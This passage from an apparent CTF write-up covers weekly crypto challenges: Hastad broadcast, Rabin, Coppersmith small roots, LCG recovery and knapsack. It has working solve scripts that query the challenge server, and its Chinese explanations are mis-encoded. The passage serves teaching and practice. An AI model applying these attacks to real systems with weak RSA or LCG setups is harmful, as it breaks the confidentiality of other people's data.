<h3 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h3><p>å¹¿æ’­æ”»å‡»<br>æˆ‘ä»¬å¯ä»¥è·å–åˆ°å¤šç»„ncï¼Œä½†æ˜æ–‡mæ˜¯ç›¸åŒçš„ï¼Œä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†è§£å‡ºæ˜æ–‡</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, gcd, iroot</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29452</span>)</span><br><span class="line">n = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    m = p.recvuntil(<span class="string">b&quot;2. exit&quot;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(m[<span class="number">0</span>][<span class="number">5</span>:]))</span><br><span class="line">    c.append(<span class="built_in">int</span>(m[<span class="number">1</span>][<span class="number">4</span>:]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op</span>(<span class="params">x</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        res *= i</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">m, a</span>):</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">len</span>(m) == <span class="built_in">len</span>(a))</span><br><span class="line">    M = op(m)</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> m, a <span class="keyword">in</span> <span class="built_in">zip</span>(m, a):</span><br><span class="line">        Mi = M // m</span><br><span class="line">        ti = invert(Mi, m)</span><br><span class="line">        <span class="built_in">sum</span> += a * ti * Mi</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span> % M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCRT</span>(<span class="params">m, a</span>):</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">len</span>(m) == <span class="built_in">len</span>(a))</span><br><span class="line">    curm, cura = m[<span class="number">0</span>], a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> m, a <span class="keyword">in</span> <span class="built_in">zip</span>(m[<span class="number">1</span>:], a[<span class="number">1</span>:]):</span><br><span class="line">        d = gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>)</span><br><span class="line">        K = c // d * invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">    <span class="keyword">return</span> cura % curm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">m = CRT(n, c)</span><br><span class="line">m1 = iroot(m, e)  <span class="comment"># å¼€eæ¬¡æ–¹</span></span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m1[<span class="number">0</span>])))</span><br></pre></td></tr></table></figure>
<h2 id="week3-1"><a href="#week3-1" class="headerlink" title="week3"></a>week3</h2><h3 id="Rabinâ€™s-RSA"><a href="#Rabinâ€™s-RSA" class="headerlink" title="Rabinâ€™s RSA"></a>Rabinâ€™s RSA</h3><p>å°nï¼Œç›´æ¥åˆ†è§£ï¼Œè¿™é‡ŒRabinçš„è¯ä¼šå¾—åˆ°å››ä¸ªæ˜æ–‡</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">13934102561950901579</span></span><br><span class="line">q = <span class="number">14450452739004884887</span></span><br><span class="line">n = <span class="number">201354090531918389422241515534761536573</span></span><br><span class="line">c = <span class="number">20442989381348880630046435751193745753</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">inv_p = inverse(p, q)</span><br><span class="line">inv_q = inverse(q, p)</span><br><span class="line">cs = [c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cs:</span><br><span class="line">        r = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        s = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">        x = (r*inv_q*q + s * inv_p * p) % n</span><br><span class="line">        y = (r*inv_q*q - s * inv_p * p) % n</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(x)</span><br><span class="line">        <span class="keyword">if</span> n - x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - x)</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(y)</span><br><span class="line">        <span class="keyword">if</span> n - y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - y)</span><br><span class="line">    cs = ps  <span class="comment"># åµŒå¥—</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="å°æ˜çš„å¯†ç "><a href="#å°æ˜çš„å¯†ç " class="headerlink" title="å°æ˜çš„å¯†ç "></a>å°æ˜çš„å¯†ç </h3><p>å·²çŸ¥å·²çŸ¥æ˜æ–‡é«˜ä½, ä¸”ä½åŠ å¯†æŒ‡æ•°ï¼Œå¯ä»¥ç”¨Coppersmithç®—æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">n = 131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899</span><br><span class="line">c = 11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379</span><br><span class="line">part = bytes_to_long(b&#x27;sm4ll_r00ts_is_brilliant#&#x27;)</span><br><span class="line">F = Zmod(n)</span><br><span class="line">x = PolynomialRing(F, &#x27;x&#x27;).gen()</span><br><span class="line">f = ((part &lt;&lt; 64) + x) ** 5 - c</span><br><span class="line">xx = f.small_roots(X = 2 ** 64)[0]</span><br><span class="line">flag = (part &lt;&lt; 64) + xx</span><br><span class="line">print(b&#x27;flag&#123;&#x27;+ long_to_bytes(int(flag)) +b&#x27;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="babyrandom"><a href="#babyrandom" class="headerlink" title="babyrandom"></a>babyrandom</h3><p>LCGéšæœºæ•°ç”Ÿæˆå™¨<br>å®ç°ä»£ç åœ¨äº</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">GetRandom</span>():</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    nx = (a*x + b) % p</span><br><span class="line">    <span class="built_in">print</span>(nx)</span><br><span class="line">    x = nx</span><br></pre></td></tr></table></figure>
<p>$S_{n+1}=(a*S_{n}+b)mod\ m$<br>æ˜¯ä¸ªé€’å½’å…¬å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è·å–è¿ç»­çš„å‡ ç»„æ•°æ®è¿˜åŸå‡ºflagï¼Œä¸‰ç»„å³å¯ï¼Œé«˜ä¸­æ•°åˆ—ï¼ŸåŠ ä¸€ç‚¹æ•°è®º<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45883223/article/details/115299389">https://blog.csdn.net/weixin_45883223/article/details/115299389</a><br>$S_{0}=(ax+b)mod\ p$<br>$S_{1}=(aS_{0}+b)mod\ p$<br>$S_{2}=(aS_{1}+b)mod\ p$<br>$ä»¥ä¸‹ä¸ºæ–¹ä¾¿ä¹¦å†™ï¼Œå‡åœ¨æ¨¡pä¸‹è¿›è¡Œ$<br>$S_{1}-S_{0}=a(S_{0}-x)$<br>$S_{2}-S_{1}=a(S_{1}-S_{0})=a^{2}(S_{0}-x)$<br>$æ³¨æ„åˆ°åè€…å¤šäº†ä¸€ä¸ªa$<br>$a(S_{0}-x)æ¨¡pä¸‹çš„é€†å…ƒè·Ÿå®ƒæœ¬èº«ç›¸ä¹˜ä¸º1ï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°a$<br>$æ±‚è§£åˆ°äº†aï¼Œbå°±å¾ˆç®€å•äº†$</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">64999433139797068147576269731948390094958654326970231465808792590598519729077</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28748</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    x.append(<span class="built_in">int</span>(r.recvline().strip().decode()))</span><br><span class="line">a = (x[<span class="number">2</span>]-x[<span class="number">1</span>]) * inverse(x[<span class="number">1</span>]-x[<span class="number">0</span>], p) % p</span><br><span class="line">b = (x[<span class="number">1</span>] - a * x[<span class="number">0</span>]) % p</span><br><span class="line">flag = ((x[<span class="number">0</span>] - b) * inverse(a, p)) % p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<h3 id="knapsack"><a href="#knapsack" class="headerlink" title="knapsack"></a>knapsack</h3><p>(é«˜çº§çš„)èƒŒåŒ…å¯†ç ï¼Œä¸ä¼šï¼Œè´´ä¸ªå®˜æ–¹è„šæœ¬å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sage.all import *</span><br><span class="line">c = 292032237605703789031443546112168465662583427817451138186159085483944596334899153983563673441672190426682450375063969461376062147027084612402086056661404230388212669024682288498017434447903079894895044646783044615700960214968206461515747700863707804674135323403322674848342947433907419384351538542352190054502</span><br><span class="line">k = [1608065985136589955518636876548002749173398195805908561413594566081660968014667899832608099402330306643714300075111493399031018875367895290978800182262583676853981874524478795562164083876724225562910617434721559348811325228478100840349704502825475625301310959989478861007648220652524232130866274135218984561, 2426667349302925052753129094681603564581547445694425972149058783410976244113409382609652684285673268926585915465121568674105405583249932303853277106022465162299776054880646164667515914638855621656976695492670793997554806230559887797430130967584045823908435269522635470810929590225201734899469120862897857906, 3429483048920859588228800664056147835206575859139809437729513989612905506968030247732277405170588036945046103148181571731475515968018728356999146064018705816079990332391171720831697179560208441190869409352610039321524663718448744716582427839773919710116270407307201813934309914325458374662174960190245957222, 56425010956371256448246243268037781632639922767089972857768932087073862372804260941055847027639568892620749001152456412613776226413648996114511873854390857464940061288049524118854209263921746793476386468543364294684706273576618917594983701530906450790737740373654984594497994398342234224269852299909786917, 2490148405966221496416605271766917944760574681421947779308643176791508974209226864249738961804267751531920519607253031119552656778832611158482425651360225112014889722067929942129410647789542841451918095993121030645140097940914026737410542029696262008354153670514285804682813068751684055223569331294281905118, 744335516743470311433495353720410462797590932472861071020740460215850064443048990503206674029768738281613724459334902647142111609386032626419807763430772690331198728393460206599560093644541916308699753208688342851978033928606776623217187488326243128140520766001009008201386016425560302128789112878698236289, 3811275049854002124670197266442901370413146380714854518041025464151849775536270057261222936366704504717168540821482432524581823593068766111036867810233424188570517910875954137654522213277153239298775268202412265276391969412101608136450034362297594484127681402703758637422994850056368647615489523794861880847, 4736836665940826041171694132923988931845101417647374332819683867658151216907483131765392822718944507370242286701332413933742097451162974561725364631534151059773942438038783618842467372195820647253852754681662349983386761479952007635484482382467925975261261100119940525951529612029111682683502811860704744107, 2184288239784892480695351146181522343103055473472054415892055011557076197493348610705780911639069852142681212813978124320590741444078993617676557686712572852495709125855358826418698444456009029932606748574019720427857423438968969137406147167435728319431977018686862316554361964818593535134605527966283094812, 588194102339696583350135841824327790124834713596509154434237624805397239340526856351652054792548887203985807293311816082012326594259020613540184041154797618078327175677613074289570022322357182995479906623119955070230707330622384565298411040387807899564480684801466385397273974163223208276864942123556821984, 2077906466303331037266972319970279217258043930377897803588850251077437486936839431262259636827780499338786000900607732211607800334437439411320588909761412208903115247316321339144063222215148211341360284840791579449274150984227297525853407129758195258114613336922940637602426813584054603519438429403287901807, 4060696287458178132166969775611183857321717695909596307983521934391374906105468401724669893440236137597759531026401897954262009158003862889711338109339144634743467096248961069665302863564279743914614929002755913987145938151818768559151108680179120567043334062947260416139148527070005414031278334913676278825, 4648055212181913199241601922647752559148310859063413915617491531022227482221369706329584019871516807125335049899238193299170178941865351952526303264382540623662751970694196678643148804700140310686029928338258113239246369236839815299421412433228129370572769064025027782499557120467483913439554278498904974692, 597176878045185163079857438985773795710566287596407799734356772474742131529190202967137742454916982072691342662052310864747435205021028361215252674178315997198269741467302622198726752215953160339956800052041597499968585794961367600105538786381642026152409490766928746822529886810175008512823872740471937665, 2910054858527388830403932368779621604363339825851733588186642536470920279459927147643083958572082724465912571199462751727511781206448016590724896631420215562383093134176059068836185007547883467363788641586218097259132532988047680444596481336102344068849705827845373152194082875334989539786061281633088702207, 3696225688659541674514429144747887228548438553421347322179321479441707736085490479925695068682857925820906600716811206668674362670255748441491863826159297563586283856711895274967453111525058741957741388117733577248416227857299641721376648385102843604523548256761323973316013492759706736947255531758861421477, 1264925539817716129014576497035166821399904498843295574478016769881855695449072100438634702685104077900942950531746967236836367541973173252729535587899140145556274961468172106138699157373099481772657234211840356840928934367479697752383329641624088906300664151102190244861916711255701268993286008770967460566, 4571007407218171376424110614619883673340506723497157430034356354946308188791286500930618019768782785808738651009380531664322930286075573732857533002268527483303325125815338437710383276782094697464296556561635650192997376958252519129067160493545151596993469863677168612507678829366504521208469249583156145062, 1607275751862389848931579421908559342709368592462574876274965760526121100510794144786052958249913960025018042087109590745931445493710553976077015732888075612716822213569024944317709696157222658354305384754436338586170866943232611395186803895850706105104633938739700570617756272254018986963765629888951737092, 3231482882821525799296232079268975132628226834188813042834644439762217765053533385326968261700098026212043361747011112721207439471171509517132716408625574448212648885013610454405496823675923432663129324575017177361298412424859120473653168845998318565505904460291219279379949917240714510026168261144328754054, 3520756943869114055247771507983524428603360509892140185215072107632169908164209572971189033766284497193142577714214719937690632620807383452941370389221221578877005020761180420690667701357084962898452818923425965250194938713381636834757219964144287681756320982371633697825501678773072609037834441639946225339, 564403960688872564494042565904665280137135985980812477996104058233360726954980651556261866550808047905203807135975257955628888925792823632901368848326812395864809366082008793001123947120817643292945421197846185465088798386204955957297160837369871862119608719565286233632933483485107886825587988325566420769, 315959983412675584879150300480980412474498336983333058244546717323455930859057635392845900347749179949704745226560004600224895066675818550275520877089383803806869595787780164683206194624514937603600847800253240223046758244243173853100476864620378942952204542538466227047478926569550153847751719869006440425, 1359018660778713519182671363124066408395251129592238792702570061458306199066654656327632765206370559628006041477544326679409292399624549148446056002421371779947111512017053024997311782053295887885499499900871425171459104733621657232622887633643535171009046754834506810886208598640313323992402587826510775114, 3143179053950367778166107548875625357080442600180871628766656421101359811522386849734312179769425670257807747763366111882218302544429356682960973863412113938212617992279105368728046281321277793429612514556884875498321471342186005935474830535432685394050401665427753950451870384061138957671000505331584279579, 3424041059481832864742209846632834428678464465053787826056153859972012437109619845448193496222177675021019548028304262054465072804764440535807084060970023895403210534439206560638265706687193261054302798091234069541337163405569239043076218876024343962544888119971652503894076571165979094263390475575893193397, 3394972557115014896582730524811582775165719006608331601536895581299976733846094213905437335060330704042911954267160117024403703576967676979692402911756772597787115284555393956162858666992823855559436532779737873277280234871340407793612861369949533029425471378372119261785736583555982259686027963800114519102, 767982683763338160290017550677214093769106704491468427905876141797664016593400484148498742145536603311483520370631640194250658359513883372410529317557191238184311706705838095244878422832069949895389250127322194863186729472408042980350123307774174867627999479980065280115383136125967992634632411086694698642, 3422540924960544612834585123729733616645553900174459638595137499785110833438504509800635685035170980711379111110998342973555998772845994627938368908066944974448421606476842842744708489409568114738191780149071182251924924154408311173667690121855018031507506246608870132949759899179937794826047342152620292095, 2076628142562411431193260425909220171296705633984743027123722251828899204850932905454098139619184381148082735631705741868953008514407774642601331034180338211496774774791222051968398724513483230081252598969671908696508915091480770301702104673383638671583594522919770174845091152921903576965119090911034877494, 3189000454894790851508643883003404757686995689728100342704292699051819454370619492435584632046952795828014792724252564437409669861386664128425419749205118639851420416805611265987240650591570288819441331386388096898355300213251314193247203474170004062127830101296310662295136957482763725859911828673870073010, 2907150768758367886586716856492146141149987720809000627386111421643110094118983371407767929904033371916068536282044312598041047375502394605750826924668621476494681229069074757407895343467711270265146813743924924350467166961246868819544022337777611791807371441063474009314515450764620220073636926521653862968, 2514385072822938980004922507739039623213197750007579507863286260748435647726447515478421742855973407150598083238408348940948659789166184923325380104358023583968000101986752922281017736336438115334745325808437403756600270989274248698777794299729025975621235093801536125828223010916623183270792167823391314339, 4129101408426925717270552379939869969462339505083750544797736541259757510320156554069476949366400728041791814246488971033168156032323532108146683445223635246667528163299430626189843150118857560146372215307245784118949072729530757857062091860914386530146966295084237748993297755170788155139701609454887642189, 592435070792854036461902755632415150930646219825275494995704405210968841040629694144327928092929922909898934019797113069018676965659448941534627918560192454634915263194744672162906748245323359801539030421486363693479747492739167860076793115084698431784280178395907832496292090848269244845568496776121048420, 2865081789369306893154991033764735467685871707277377218183223375617779981799973856854786718581900741247430593563538242294481420170548368619693814116986102431074746102530574129385108670674829793885445823488366746211939790255318819470661864602435004540416394683778155091007365314457687943582106086383434350861, 251391258714263204956657192185231188943160321652135329260264002476438499179758785954858306203909644226662633694242501403168759406433259397406932989254919691213227015152420952191840925766708845560415152018030431214027920499204307959550731819022116632063749364551316540057073676174948417613616029204682207498, 659384723012287778982874469102674194729642950765762947339029438294465624178903943230781035007197453043407917087130440696900821572650425685604124960327195084069431360651239951933498311555358398796549450526062345075410197217697206633409546614255593820522021931451531912704546349794754510069083609031409248937, 2426015109860963685265746512687937789091377922049478006530805180879855604062651538855351907709057208551010681642061459995570015242556185123653554175228858635684219019015285945979801660351775121696847472734754301551492595986833606031144106471739246647563319118176667308020497901939839988917087746181229065667, 2525877031078673287368055372541347308620587609819404238360987948937210254003467390351489023775890685319458157199265530962051187524661634143415580445422222118839133913670988791987913550492250501569446783701526486015110050320714740192346307908359345974170083063227017143380075781142797561742757168591170431005, 732768928580119156094714905470431755951220001695692967254356266424803019171824186106635920047016493731598322961621456136045426053182174281299298171457892943035628932693593002972569811423472930877675923483250320285199134097063623242942245320335617570876006316142286141477732903642514475998396604403875538126, 1713075318163482543035607888694028734282694723540866771257489312949731729867451895002415031438072105821281931406090644355722934364012514171694359201723633543790142137093107490826535303014605095659846137106308559615589840335232832636723868215269579648052117257204264424008595205714896388849335458748497822543, 3206030671128984113530830309177856630061151077272710507654391758860197005426017882446786133353799298831133785598099494440400390320422585018218554331274457777959194601952893538104960286760312454840928281693976980369524299791880038234512870260756182855709317464342473113313260630724970948400639684898437174131, 445877602282692935696209712317954470877142704864856891828249426135605594268024261646147797545280327679388745908767233133100343152307397565685762453671712145805994933944113578059370014148275504577151287440989172031015611066447856005365332241783974336289375636169009439591968164684890905627670506826067644748, 4295806455136688460282792834328399604062338768814921438926176686908423403962628547564739585989088193984331621676431469210575448270423176766350053455370528181528187650287128113842092773306387117707015664608767974649475285232110757540420290085285387277052398369374412839149430241121901070182878177779766827985, 2315183230747468539901572410823712634195405604813627486581938983970506769088605108642213603692757389396301765946984918156979117789903373888118705804351795764852912596312935816764673348499015426746456365834049611680560504798561899893873110027359835176922898163290326344366278162799640783569200922149384205009, 2709883740389810279365385940437096656562788270606810498693427349076113450585710362125999434154172083927380062042591579804065240386305725680903876683008041411459059118387545472319436308853696256813357089080031992773999500370274225231471068370333280353187355400873961632126707988907859983099391762494801772868, 1905877803809277746039923408128559460261246253332991558138482099322411922204404256653319787704004392297096385734814888648979557467359768233865757035895316271195939258102324258669679336576679363692755368433284226911087680896182728662504500499583917681898428546988994402228245893257641269710985866908742058351, 2777093303340675091580625532323382682129691864696281736202581450688282358145827305972597165522439567019169702252499397105808228982816274171858619196572325252090716164754428653471484126322475352179404916448695972332203909050954267925410042960886379996367981748227262826353064727267433899571018034865132704531, 400099068637092273133972962113072182359643459523164348592014836450122186206026122394030834593959378383718768018630906909662176542621471783076517321930844229460041330895088676945511227366577477141927693769853360094080373738130986776817183221244382063909546208545753556333958009848802143241794378778683932535, 95480232861080887148358949937991373063092649181462448751020036819626579067760501815779519646268230398603103950707525204526097843797674809978090578295201129966765712862260632096215874817242317309284158864004538124514667981606709682660369553173628534354955141758175565938353910452585266775291486924040287287, 4206564390274181347080014243912076202774818568255193589212468833402308873515005261904107407350761468151180411785518045896793882555293831354808573632047790471914302406927630174703561525556261153135936355723670843217968200793417249577620759095486376226873702806966391622687408670670332024471946214244360570527, 769581546817283749107779159740174748523198927410082512915961922766733767813883465793200394139576122978258778956759789880193669138236212424204795874435723563406044571312451089777122691186730272985486340798548572537410198342282788909076007414314743130146594427350337285968643087714868961225425427051443428871, 4205588760010753570183010447576871563608252114372802716375294049628998583455681856572076435197770950017315712210184921961064340013413638913213275784072055670800617280198498410976367292113059360904240872793292322639230272883074388688191241489247501227134113953797523584042177459022347457719985960527177846367, 1673981580767141935253840404067283389285984798963604802473535562441841136663982533621295752542370430497885253698235901516381162311845117952142117326856590929543090980773849180567395429627682737967221875012257442922170543337921831960914249282293152499404813222987199710342332861917285438024389290006917774294, 3839091611022961244047084056865475442636219805237296670005081129521094689404090527874429122484021669796230275449655356421559023294473222085100916762186074843297468793318851172467512250235616943665351451217851892892301363893666565008610824180691077225750190142248598518041362314450625095641688369586817758181, 3887416604133429389606449254495559458167225845439320898274897424317852791696295373313509870873845629557868181477072374026232142315609706739829084179756122068214642915022078095234288540810633350139229158796821451877239399418934904305674776517367438666855891631003570448701637640176452185800424196171496804818, 358492333565676008138804820465560251866006888339882470758115920308108101540837655175739996382881415152755446178429914320270937738321390695745154623432872863053912132168831555266403803315291750052720867125153396272471453072535893765701565177051817002933323643618478950737883667136067774178095466493459619255, 655812335243508201841489724919037171123201658969633886949880732517267083890765645593593434761785507515535515565657116283187784736178668333545133076273636138135833987984809848133611532643367284325904339405911972668756220407073182564506316209055015014469467889679610596073319819057883016116200501750860612158, 3113775244641122181986381191288292039997042853349966089486819525049061751051054873716149031919321626703544417783539774253194197296560794790000355981335530357571600127442879571785843011743587545022436919426522578142377799506957957999574030096426711613548818233897612949883540018947887118158145895368659001913, 3346536951357092794922857686071205592427326377071985417031573600335117248052742314887234312517253459355498430124358526765831884843781046449528488703718774190764032463366296311530766780372073925895846392088965958209670093159081446466328923256632162349085747377661326885434440442540542634700414979519156846378, 2271935487447997615072827715629425090467014316320748569661772071398835781211814130487355070035384524783329644561795490975450269915996630916738702592546834206510451616435749464537109864004197818387853698579320129733065396669474592526208512959974455298956514608692308826341738026708214485942082640212151722824, 776466492143310072596268802159330789564963600828637627540853399297900489203518721000908793370986461631222499074382757467232864517137871669997931139488027084842942095437762256079350478191749823969820341524844810742948700598495048559883397493931440849395912715652538689399792836947662852820103532717567990825, 2414274645882519519084023913396357272407167832626523088150811990492559442026397060738140352663005223129337187125965764012914780402110158227540931469017964124622910527406899007518667711067230671586565911241474521955001186241607041127655651458938731994650169928913125748912643646524991538893335177389904412170, 1587401214609797602331682440041479743512176522669626586231108195155202838917998415252279686533695314095297559308594308729030682798135639449094642378150127492601244357366175151522933633345524386369722790804782728844770761877138025423706525297203340243728319358418982837426599728607392540185563391682179754091, 1276538048517017724799741818279571647670714435038811528782147972756642391251134331211078877513430205745909112356875543624846934625909319249857420925371596921159773634075408031817229527925246856861069484405721039888258313585591750990749824522485321295837665778185313292953880124411255737622409525193124459735, 1538485199904895231757088486985252668728362373981931817960801712480113335144533151864247552181700949983397258308916404658891775035166276951736469913599712794627172532234260428887502063542242388200715134922033848610833955337511115662975240925681126009991412680235365215325155354418216805045691690371175736694, 3206304631930048482883026701884292735383942399324272782150656595986130488178312338403753056282079561305071127800552734066603684476317468336439123025478022512848222910190232348231941471763205513385207943068182799579334996844368914081954765697685511608500913811387200371518850567627179307512637861874238561003, 4060974136109469828397749836390448767241682974331277126152803469744907898850600258735274223294110211845166146970522493710400206529822968619805354770338935377761626067850932707127865463424756008394428715555169827742966901642024793693796316287646900078900367177173010131730253761853898589232594239369879107744, 3186685901580513856509872460979635165561061950606904814133798621836392578498358298660957761557506177619855027178183087244891177317508831823775875116819379713319584842647833087351777216785095435169291029372340194446221915994696340583825222189631540468961340287055426423943291779572102944050203195317543086354, 3136611334284792133367261650890227232936288665608393703140476960273947363995950090616216841862364676224975998313927496717442151280046513059844234925813488608538868806165304615153462666921851828369973348820514900945220768530718340515375059152719890262379622822092495480472265940696852626966083066449081013515, 1331269884708136405117905393673690029448536867574991764756810112456133796939866167105752401710654064799841814208579960739840945274552356162539929238201263094768628435429424780269405617728361664291326922086470728054557840896594861984932337019178564604767425068305896370361563415307622875854960715955519891364, 2629686842528554368371212649266207118104297767714724637715724853710062224883360018658184081051834552922938103680625457768521020704489138289673236192361797218197291790011899341547550168847195307194675782016724355461838129391692029228873360080499876909101598246901009730064927090298523336479377558017493242738, 1426300450885754401333308553071633549193728206537905148455464373889158946625349170708739895297669403110835467058502210376906639329985356457538282521567307751689596391816389876022943463820616797499242065593983413552042271136651578216676477358517644481445202546424950276409332053665700078110891422676737000266, 1115143586269457046388508860118731296403702746525652794518901402580953108524846557836251872330464547316185544242979242626492070655689348375188220456348990656723775351040670864330649927682112162394335389121196801586057211045506076134902459021977861676061786586552967325367078555699852757953879038529960478826, 2367010329759044141740459116302334258738079352309025401865180633681967129718049381760374265533928185763470126970233153393433362149316762427869338542193490619295261584721180390642443116162125260063543158277093503519396667868754170989734908563649702639506310182324432964149001826312565165291959861876316107174, 2369956571182687113385124970548942876722086028916003668607492554799566426508715514710684580412196675124348306094302517736377191146560033416998222407410700276968032415018624603140969715321560855087801587002876000914374065245540460164369067028055684387229685317408498952218117392120145026141932065722734086573, 3854841350561727593245891090625338537089363579767822034014398089229606355892699347245263968564846767146741783584492207093850447805904831377806981335000796755720650243118052758205725952167889135780685666302792946816677759787075975030143263198454358444000314894537861184800223256200612550729345434612069392730, 3401586406886873485507776328101144878822167922493875544544481751600285305001073837485176747426438942163061719012159262979825380870846722864659278767623249012563130053380471007633703779101021876571208363913916417267510669400579106416154511984480469979274724842386104366805464432583011344082510544510387434007, 1780411204742756113339719485654719323514049671655752818458571719669782429217232128095729463729175101515417880396147215050401574197952485666683528215878232167927536265615448461472688261492869669745117088492146391814903227508319392827577962305176903913127589561464776045840282375141308226722660431066262879083, 623158759606146964243321604792792604328830973124825909315869354153270589280565795450154648529086968171949619658615994842143616224671760829560230125417151577087316903718191831791549792534697044357146454674539729006792403062341153282797354669567567369833711554020746696510756773687293614969485135144052897743, 2874962898871141994988116678255360066513926880267417781711095682301520155111915909397882230832415313912219033418575053452819516802259871606128751332802897619812935849791153289338565346476601944570277879083700171017502164694769285858947683642556357324745291066960174235314446585743355585531499937629504399370, 1615873108388769020548178055085255301216704367824197683726890282097172769463327555760194291309353870050824187347172037611766085820383097535855545837318116353353694343187424225078883645748612609371762170267307170926217729936859847075738023340269879295777597249718746227403886887371940212669289587365700336993, 525108755827176036474671732056255094683730135486249812303654723006821993795522820737030334467297449372017838930343899416337585019857607592395449704179963379244795114955118499384308808794611614840974952064962588444759072806096028616305005381563004924825123136405284139928572887251958119886649167419066264050, 918332960100982527049395507203189384302050684796505973689025480448942770394500284124542244610198643370972431577880649249814517167066562245328653608755518782076648032146285166516777171524626837608390406381647370835132346441302989043383145289041797236626680748996797113478650559151911278724265910924039127968, 2964248574506349048215911748681858030717673430993075417633208945744206516083608296085695157611633489758222354627610441817099800915383283328596970528768280941269749565358018402239014420312405894337849134824919249556370981771263030467535268546970389952421040003308715935633420033941510804561875679537460227629, 85665955692217427570037812355751530568998228500013644584147356950933469172554530676771019364954385121428244865258438404239942485976299803575517277958126024127109238972482638034393248928113920562771287085970582579067523599702816353552740408438787627223203755224709683116502844765225875073921733510288291776, 